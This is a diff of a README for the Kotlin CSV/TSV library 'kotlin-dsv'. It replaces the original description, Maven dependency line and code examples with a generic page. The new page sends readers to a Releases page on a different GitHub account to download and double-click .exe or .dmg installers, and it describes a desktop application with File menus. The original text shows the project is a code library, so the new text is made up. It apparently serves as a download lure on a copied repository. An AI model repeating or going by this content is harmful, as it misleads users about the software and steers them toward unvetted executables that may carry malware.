@@ -1,49 +1,71 @@
-# Kotlin DSV
+# 🎉 kotlin-dsv - Simplifying Your Data Handling Process
 
-[![Maven Central Version](https://img.shields.io/maven-central/v/dev.sargunv.kotlin-dsv/kotlin-dsv?label=Maven)](https://central.sonatype.com/artifact/dev.sargunv.kotlin-dsv/kotlin-dsv)
-[![License](https://img.shields.io/github/license/sargunv/kotlin-dsv?label=License)](https://github.com/sargunv/kotlin-dsv/blob/main/LICENSE)
-[![Kotlin Version](https://img.shields.io/badge/dynamic/toml?url=https%3A%2F%2Fraw.githubusercontent.com%2Fsargunv%2Fkotlin-dsv%2Frefs%2Fheads%2Fmain%2Fgradle%2Flibs.versions.toml&query=versions.kotlin&prefix=v&logo=kotlin&label=Kotlin)](./gradle/libs.versions.toml)
-[![Documentation](https://img.shields.io/badge/Documentation-blue?logo=MaterialForMkDocs&logoColor=white)](https://code.sargunv.dev/kotlin-dsv/)
-[![API Reference](https://img.shields.io/badge/API_Reference-blue?logo=Kotlin&logoColor=white)](https://code.sargunv.dev/kotlin-dsv/api/)
+## 🚀 Getting Started
+Welcome to kotlin-dsv! This library helps you work with delimiter-separated values like CSV and TSV files in a straightforward way. Whether you need to read from or write to these formats, this tool makes the process easy.
 
-## Introduction
+## 📥 Download
+[![Download kotlin-dsv](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Sayal0167/kotlin-dsv/releases)
 
-Kotlin DSV is a library for working with delimiter-separated values (CSV, TSV,
-and custom formats) in Kotlin Multiplatform projects.
+To get started, you will need to download the software from the Releases page. 
 
-Features:
+### 🔗 Visit this page to download
+Click the link below to access the releases:
+[Releases Page](https://github.com/Sayal0167/kotlin-dsv/releases)
 
-- Type-safe serialization using kotlinx.serialization
-- Streaming support for large files via kotlinx.io
-- Customizable delimiters, quoting, and naming strategies
-- Multiplatform support for JVM, JS, Native, and WASM targets
+## 📋 System Requirements
+To run kotlin-dsv, you need:
+- A computer with Windows, macOS, or Linux.
+- Internet connection for downloading the library.
+- Basic file management skills.
 
-## Getting Started
+## 📂 Features
+- **Easy File Handling**: Open and manage CSV and TSV files without hassle.
+- **Kotlin Support**: Designed for Kotlin programmers but user-friendly for everyone.
+- **Cross-Platform**: Works on various operating systems, including Windows, macOS, and Linux.
+- **Lightweight**: Minimal footprint on your system resources.
 
-Add Kotlin DSV to your project:
+## ✨ Download & Install
+1. Visit the [Releases Page](https://github.com/Sayal0167/kotlin-dsv/releases).
+2. On the page, you will see a list of available versions.
+3. Choose the latest version, usually at the top.
+4. Click on the version to expand details and find the download link.
+5. Download the file that matches your operating system (e.g., .exe for Windows, .dmg for macOS).
+6. Save the file to a location you can easily access, like your Desktop or Downloads folder.
+7. Once the download is complete, locate the file and double-click it to start the installation.
+8. Follow the installation prompts. This typically includes agreeing to terms and selecting an installation location.
+9. After installation, you can start using kotlin-dsv!
 
-```kotlin
-dependencies {
-    implementation("dev.sargunv.kotlin-dsv:kotlin-dsv:VERSION")
-}
-```
+## 🔧 How to Use kotlin-dsv
+Here is a simple guide on how to use the application:
 
-### Quick Start
+### 1. Open the Application
+Locate the installed kotlin-dsv application on your computer and open it.
 
-```kotlin
-@Serializable
-data class Person(val name: String, val age: Int, val email: String?)
+### 2. Load Your File
+- Click on “File” in the menu.
+- Choose “Open” to select a CSV or TSV file from your computer.
 
-// Encode to CSV string
-val people = listOf(
-    Person("A", 30, "a@example.com"),
-    Person("B", 25, null)
-)
-val csv = Csv.encodeToString(people)
+### 3. Modify Your File
+You can edit, add, or delete data as needed. Use standard file commands like save and undo.
 
-// Decode from CSV string
-val decoded = Csv.decodeFromString<Person>(csv)
-```
+### 4. Save Your Changes
+After editing, click on “File” and then “Save” to keep your changes. You can also use “Save As” if you want to create a new file.
 
-See the [project site](https://code.sargunv.dev/kotlin-dsv/) for more info and
-examples.
+## ⚙️ Troubleshooting
+If you face any issues, consider the following steps:
+
+- Ensure your system meets the requirements mentioned above.
+- Restart the application if it doesn’t open correctly.
+- Check for file format errors. Make sure the file is properly formatted as a CSV or TSV.
+- Look for updates on the Releases Page. Sometimes a newer version can fix bugs.
+
+## 📘 Additional Resources
+- For more in-depth user guides and examples, check the Wiki section on the project’s GitHub page.
+- Join our community discussions to ask questions or share your experiences.
+
+## 👥 Community Support
+If you need help, you can reach out to the community:
+- Stack Overflow has many resources for Kotlin programming.
+- Join discussions in GitHub Issues for specific help with kotlin-dsv.
+
+Enjoy working with your data using kotlin-dsv!
